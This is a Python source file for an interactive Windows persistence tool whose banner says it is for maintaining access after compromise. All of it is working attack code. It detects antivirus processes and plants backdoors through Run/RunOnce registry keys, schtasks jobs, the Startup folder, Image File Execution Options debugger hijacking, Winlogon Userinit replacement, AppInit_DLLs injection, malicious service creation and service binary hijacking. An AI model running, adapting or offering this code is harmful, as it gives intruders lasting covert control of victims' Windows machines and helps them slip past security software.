# @author:azure
# @time:2019/5/17
# @file:bls.py

import winreg
import os
import re
import shutil

class Bls:

    banner='''
    .---. .-.               .-.                        .-.         
: .; :: :               : :.-.                     : :.-.      
:   .': :   .--.   .--. : `'.'   .--. ,-.,-. .--.  : `'.' .--. 
: .; :: :_ ' .; ; '  ..': . `.  `._-.': ,. :' .; ; : . `.' '_.'
:___.'`.__;`.__,_;`.__.':_;:_;  `.__.':_;:_;`.__,_;:_;:_;`.__.'
    '''
    print(banner)
    print('[!] 该工具用于辅助权限维持，Thanks~')
    print('')

    def main(self):
        plug=['1.指定进程检测','2.开机自启添加','3.计划任务添加','4.启动文件夹添加','5.映像劫持','6.Winlogon registry entries注册表劫持','7.Applnit_DLLs劫持','8.创建恶意服务','9.服务劫持']
        for p in plug:
            print(p)

        while True:
            user=input('Attack>')
            plug_s={'1':self.av_search,'2':self.self_starting,'3':self.schtasks,'4':self.add_starting,'5':self.image_hijack,'6':self.winlon,'7':self.applint_dllshijack,'8':self.sc_add,'9':self.sc_hijack}
            if user in plug_s:
                plug_s[user]()
            elif user=='exit':
                print('[!] 已退出程序')
                exit()
            else:
                print('[-] 没有这个选项')

    def av_search(self):
        print('\n[#] 指定进程检测')
        waf_xw=['1.加载程序自带的杀软检测列表','2.加载检测列表文件','3.返回上级菜单']
        for x in waf_xw:
            print(x)

        print('')
        waf_dict={'360Safe.exe':'360安全卫士','HipsTray.exe':'火绒','avp.exe':'卡巴斯基','ccSvrHst.exe':'诺顿','kavstart.exe':'金山'}
        while True:
            xw=input('inquiry>')
            if xw=='1':
                try:
                    tasklist=os.popen('tasklist')
                    tasklist_zz=re.findall('.*[.]exe',tasklist.read())
                    for t in tasklist_zz:
                        if t in waf_dict:
                            print('[+] 找到指定进程:{} - {}'.format(waf_dict[t],t))
                except:
                    print('[-] UAC为最高？还是cmd被禁止执行？')

            elif xw=='2':
                xf=input('file>')
                if os.path.exists(xf):
                    dk=open(xf,'r',encoding='utf-8')
                    reads=dk.read()
                    key=re.findall('.*[-]',reads)
                    value=re.findall('[-].*',reads)
                    k_list={}
                    for k in range(0,len(key)):
                        k_list[str(key[k]).rstrip('-').strip()] = str(value[k]).lstrip('-').strip()

                    try:
                        tasklist = os.popen('tasklist')
                        tasklist_zz = re.findall('.*[.]exe', tasklist.read())
                        for t in tasklist_zz:
                            if t in k_list:
                                print('[+] 找到指定进程:{} - {}'.format(k_list[t],t))
                    except:
                        print('[-] UAC为最高？还是cmd被禁止执行？')

            elif xw=='3':
                break

            elif xw=='exit':
                print('[!] 已退出程序')
                exit()

            else:
                print('[-] 没有这个选项')
  
    def self_starting(self):
        run_list=['HKCU\Software\Microsoft\Windows\CurrentVersion\Run','HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run','HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run']
        run_dict={}
        for r in range(0,len(run_list)):
            run_dict[r]=run_list[r]
        print('[>] 检测是否已存在后门')
        print('路径:{}'.format(run_list[0]))
        data=winreg.HKEY_CURRENT_USER
        key=str(run_list[0]).replace('HKCU','').lstrip('\\')
        open_key=winreg.OpenKey(data,key)
        i = 0
        try:
            while True:
                name, value, zhi = winreg.EnumValue(open_key, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

        print('')
        print('路径:{}'.format(run_list[1]))
        data=winreg.HKEY_LOCAL_MACHINE
        key=str(run_list[1]).replace('HKLM','').lstrip('\\')
        i=0
        try:
            while True:
                open_key2 = winreg.OpenKey(data, key)
                name, value, zhi = winreg.EnumValue(open_key2, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

        print('')
        print('路径:{}'.format(run_list[2]))
        data=winreg.HKEY_LOCAL_MACHINE
        key=str(run_list[2]).replace('HKLM','').lstrip('\\')
        i=0
        try:
            while True:
                open_key2 = winreg.OpenKey(data, key)
                name, value, zhi = winreg.EnumValue(open_key2, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            print('[+] 无后门')

        print('')
        print('路径:{}'.format(run_list[3]))
        data = winreg.HKEY_CURRENT_USER
        key = str(run_list[3]).replace('HKCU', '').lstrip('\\')
        i=0
        try:
            while True:
                open_key2 = winreg.OpenKey(data, key)
                name, value, zhi = winreg.EnumValue(open_key2, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1

        except:
            print('[+] 无后门')

        print('')
        print('路径:{}'.format(run_list[4]))
        data = winreg.HKEY_LOCAL_MACHINE
        key = str(run_list[4]).replace('HKLM', '').lstrip('\\')
        i=0
        try:
            while True:
                open_key2 = winreg.OpenKey(data, key)
                name, value, zhi = winreg.EnumValue(open_key2, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1

        except:
            print('[+] 无后门')

        print('')
        print('路径:{}'.format(run_list[5]))
        data = winreg.HKEY_CURRENT_USER
        key = str(run_list[5]).replace('HKCU', '').lstrip('\\')
        i = 0
        try:
            while True:
                open_key2 = winreg.OpenKey(data, key)
                name, value, zhi = winreg.EnumValue(open_key2, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1

        except:
            print('[+] 无后门')

        print('')
        print('')
        print('[>] 添加后门')
        key=list(run_dict.keys())
        value=list(run_dict.values())
        for c in range(0,len(key)):
            print(key[c],value[c])

        while True:
            xw=input('REG>')
            if xw=='exit':
                break
            if xw=='0':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKCU', '').lstrip('\\')
                    zhi=input('键名>')
                    zhi_s=input('键值>')
                    if zhi=='exit' or zhi_s=='exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('键值=>{}'.format(zhi_s))
                    try:
                        dr=winreg.OpenKey(winreg.HKEY_CURRENT_USER,key,0,winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(dr,'{}'.format(zhi),'',winreg.REG_SZ,'{}'.format(zhi_s))
                    except:
                        print('[-] 权限不足,拒绝访问请确定你是Administrator权限使用此脚本')

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass

            elif xw=='1':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKLM', '').lstrip('\\')
                    zhi = input('键名>')
                    zhi_s = input('键值>')
                    if zhi == 'exit' or zhi_s == 'exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('键值=>{}'.format(zhi_s))
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(dr, '{}'.format(zhi), '', winreg.REG_SZ, '{}'.format(zhi_s))
                    except Exception as r:
                        print(r)
                        print('[-] 权限不足,拒绝访问请确定你是Administrator权限使用此脚本')

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass


            elif xw=='2':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKLM', '').lstrip('\\')
                    zhi = input('键名>')
                    zhi_s = input('键值>')
                    if zhi == 'exit' or zhi_s == 'exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('键值=>{}'.format(zhi_s))
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(dr, '{}'.format(zhi), '', winreg.REG_SZ, '{}'.format(zhi_s))
                    except Exception as r:
                        print(r)
                        print('[-] 权限不足,拒绝访问请确定你是Administrator权限使用此脚本')

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass


            elif xw == '3':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKCU', '').lstrip('\\')
                    zhi = input('键名>')
                    zhi_s = input('键值>')
                    if zhi == 'exit' or zhi_s == 'exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('键值=>{}'.format(zhi_s))
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(dr, '{}'.format(zhi), '', winreg.REG_SZ, '{}'.format(zhi_s))
                    except Exception as r:
                        print(r)
                        print('[-] 权限不足,拒绝访问请确定你是Administrator权限使用此脚本')

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass

            elif xw=='4':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKLM', '').lstrip('\\').replace('\\Run','')
                    zhi=input('键名>')
                    zhi_s=input('值>')
                    if zhi=='exit' or zhi_s=='exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('值=>{}'.format(zhi_s))
                    dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,key)
                    winreg.CreateKey(dk,'Run')
                    key=key+'\\Run'
                    dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(dr, '{}'.format(zhi), '', winreg.REG_SZ, '{}'.format(zhi_s))

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass


            elif xw == '5':
                while True:
                    key = str(run_dict[int(xw)]).replace('HKCU', '').lstrip('\\').replace('\\Explorer','').replace('\\Run', '')
                    zhi = input('键名>')
                    zhi_s = input('值>')
                    if zhi == 'exit' or zhi_s == 'exit':
                        break

                    print('键名=>{}'.format(zhi))
                    print('值=>{}'.format(zhi_s))
                    dk = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                    winreg.CreateKey(dk, 'Explorer')
                    key = key + '\\Explorer'
                    dk = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                    winreg.CreateKey(dk, 'Run')
                    key = key + '\\Run'
                    dr = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(dr, '{}'.format(zhi), '', winreg.REG_SZ, '{}'.format(zhi_s))

                    i = 0
                    try:
                        dr = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                        while True:
                            name, value, zhi = winreg.EnumValue(dr, i)
                            print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                            i += 1
                    except:
                        pass

    def schtasks(self):
        sch_help=['1.计划任务指定分钟运行一次','2.计划任务指定小时运行一次','3.计划任务每天运行一次','4.计划任务在每次系统启动的时候运行','5.计划某项任务在计算机空闲的时候运行']
        sch_list={'1':'schtasks /create /sc minute /mo {} /tn "{}" /tr {}','2':'schtasks /create /sc hourly  /mo {} /tn "{}" /tr {}','3':'schtasks /create /sc hourly  /mo {} /tn "{}" /tr {}','4':'schtasks /create /tn {} /tr {} /sc onstart','5':'schtasks /create /tn {} /tr {} /sc onidle /i {}'}
        for s in sch_help:
            print(s)

        user=input('sc>')
        if user in sch_list:
            if user=='1' or user=='2' or user=='3':
                mo=input('指定时间>')
                tn=input('服务名称>')
                tr=input('执行的内容>')
                value=sch_list[str(user)].format(mo,tn,tr)
                print('[+] 命令:{}'.format(value))
                zx=os.popen(value)
                print(zx.read())
            elif user=='4':
                tn = input('服务名称>')
                tr = input('执行的内容>')
                value = sch_list[str(user)].format(tn,tr)
                print('[+] 命令:{}'.format(value))
                zx = os.popen(value)
                print(zx.read())

            elif user=='5':
                tn = input('服务名称>')
                tr = input('执行的内容>')
                i=input('空闲时间定义>')
                value = sch_list[str(user)].format(tn,tr,i)
                print('[+] 命令:{}'.format(value))
                zx = os.popen(value)
                print(zx.read())
            else:
                print('[-] 没有这个选项')

    def add_starting(self):
        path='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
        xw=input('file_path>')
        if os.path.exists(xw):
            fg=xw.split('\\')
            path_name=fg[-1]
            try:
                shutil.move(xw,'{}\\{}'.format(path,path_name))
                if os.path.exists('{}\\{}'.format(path,path_name)):
                    print('[+] 文件移动成功:{}\\{}'.format(path,path_name))
            except:
                print('[-] 权限不足，文件移动失败，请以Administrator权限执行该脚本')

    def image_hijack(self):
        dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options',0,winreg.KEY_SET_VALUE)
        key=input('你要劫持的程序名称>')
        value=input('要执行的程序>')
        try:
            winreg.CreateKey(dk,'{}'.format(key))
            dk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}'.format(key), 0,winreg.KEY_SET_VALUE)
            winreg.SetValueEx(dk, 'Debugger', '', winreg.REG_SZ, '{}'.format(value))
        except:
            print('[-] 没有对应的权限，请以Administrator权限运行此脚本')
        i = 0
        try:
            dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}'.format(key))
            while True:
                name, value, zhi = winreg.EnumValue(dr, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

    def winlon(self):
        try:
            dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0,winreg.KEY_SET_VALUE)
            xw=input('键值>')
            winreg.SetValueEx(dk,'Userinit','',winreg.REG_SZ,'{}'.format(xw))
        except:
            print('[-] 没有对应的权限，请以Administrator权限运行此脚本')
        i = 0
        try:
            dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
            while True:
                name, value, zhi = winreg.EnumValue(dr, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

    def applint_dllshijack(self):
        try:
            dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows',0,winreg.KEY_SET_VALUE)
            xw=input('攻击dll的路径>')
            winreg.SetValueEx(dk,'AppInit_DLLs','',winreg.REG_SZ,'{}'.format(xw))
            winreg.SetValueEx(dk, 'LoadAppInit_DLLs', '', winreg.REG_DWORD, 1)
        except:
            print('[-] 没有对应的权限，请以Administrator权限运行此脚本')

        i = 0
        try:
            dr = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows')
            while True:
                name, value, zhi = winreg.EnumValue(dr, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

    def sc_add(self):
        try:
            a='sc create {} binpath= "{}" displayname= "demo" depend= Tcpip start= auto '
            user=input('服务名称>')
            user2=input('要执行的程序路径>')
            print(a.format(user,user2))
            zx=os.popen(a.format(user,user2))
            print(zx.read())

            ss=os.popen('sc qc {}'.format(user))
            print(ss.read())
        except:
            print('[-] 权限不足，请以Administrator权限运行')

    def sc_hijack(self):
        user=input('服务名>')
        key=r'SYSTEM\CurrentControlSet\services\{}'.format(user)
        dk=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,key,0,winreg.KEY_ALL_ACCESS)
        i=0
        print('[=] 劫持前')
        try:
            while True:
                name, value, zhi = winreg.EnumValue(dk, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass

        path=winreg.QueryValueEx(dk,'Imagepath')
        print('1.修改当前服务的路径\n2.指定exe或执行脚本覆盖原来服务程序所在的位置')
        ui=input('选>')
        winreg.SetValueEx(dk, 'Start', '', winreg.REG_DWORD, 2)
        if ui=='1':
            dp=input('路径>')
            winreg.SetValueEx(dk,'ImagePath','',winreg.REG_EXPAND_SZ,'{}'.format(dp))
        elif ui=='2':
            xw=input('请输入目前恶意程序位置:')
            shutil.move(xw,path[0])

        try:
            i=0
            while True:
                name, value, zhi = winreg.EnumValue(dk, i)
                print('名称:{} 值:{} 类型:{}'.format(repr(name), value, zhi))
                i += 1
        except:
            pass
if __name__ == '__main__':
    obj=Bls()
    obj.main()